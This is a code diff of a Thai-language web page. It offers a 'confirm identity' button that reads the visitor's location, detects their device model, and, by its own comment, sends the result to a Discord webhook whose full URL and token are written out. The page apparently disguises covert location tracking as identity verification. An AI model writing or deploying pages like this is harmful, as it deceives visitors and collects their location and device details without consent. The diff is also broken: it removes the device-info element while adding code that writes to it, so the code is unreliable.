@@ -82,15 +82,14 @@
 
   <button onclick="getLocation()">📤 กดยืนยันตัวตน</button>
 
-  <p id="device-info">📱 กำลังตรวจสอบรุ่นอุปกรณ์...</p>
   <p id="status">ยังไม่มีการยืนยัน</p>
 
   <script>
     // ==== สไลด์รูปภาพ ====
     const images = [
       "https://i.pinimg.com/originals/8c/b2/88/8cb288daa036f41d26e5bf9118360ccd.jpg",
-      "https://i.pinimg.com/originals/ed/9c/9e/ed9c9eaa6c4bf77e4e89a50f5293e3d0.jpg",
-      "https://i.pinimg.com/originals/45/fb/67/45fb67d1e8d29ac96f3e393da9279f6a.jpg"
+      "https://m.media-amazon.com/images/S/pv-target-images/14117e646cbbd335e492cae12eb39762f02e1a4c0bf98868009444aec2e62d30.jpg",
+      "https://media.online-station.net/images/s/2025/04/98d14e0373115ba05eb407f05a5a1f6d.webp"
     ];
 
     let currentIndex = 0;
@@ -118,6 +117,9 @@
         return "ไม่สามารถระบุรุ่นอุปกรณ์ได้";
       }
     }
+
+    const deviceModel = detectDeviceModel(navigator.userAgent);
+    document.getElementById("device-info").innerText = "📱 รุ่นอุปกรณ์: " + deviceModel;
 
     // ==== ยืนยันตำแหน่ง และส่งไป Discord ====
     const webhookUrl = "https://discord.com/api/webhooks/1380863471041777724/EONsTADIyl9QbykL2d3oq7_YyQO_BDvgucT0j2yiZkkjHypony6HReLk8MXAphuiUdCr";
